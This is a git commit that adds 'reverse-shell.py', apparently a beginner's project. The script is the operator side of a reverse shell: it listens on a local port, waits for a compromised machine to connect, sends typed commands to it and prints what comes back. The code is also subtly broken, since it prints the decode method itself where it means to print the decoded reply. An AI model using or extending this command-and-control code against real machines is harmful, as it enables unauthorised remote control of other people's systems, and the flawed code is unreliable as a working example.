82aa78c986e4db737aac464f9821f5ab84d2c9f1
chaulags <chaulagaisachin5@gmail.com>
2021-05-23 15:42:45 +0545

    simple reverse-shell

---
+++ reverse-shell.py
@@ -0,0 +1,27 @@
+# Importing modules required
+from socket import socket
+import sys
+
+# Create a connection socket
+def connect():
+    s = socket()
+    s.bind(('127.0.0.1', 8888))
+    s.listen(1)
+    print("[*] Waiting for connection !")
+    conn, addr = s.accept()
+    print(f"[+] Connected to {addr}")
+
+    while True:
+        command = input("Shell=> ")
+        if 'terminate' in command:
+            conn.send('terminate'.encode())
+            conn.close()
+            print("[*] Connection Terminated !")
+            break
+        else:
+            conn.send(command.encode())
+            print(conn.recv(1024).decode)
+def main():
+    connect()
+
+main()
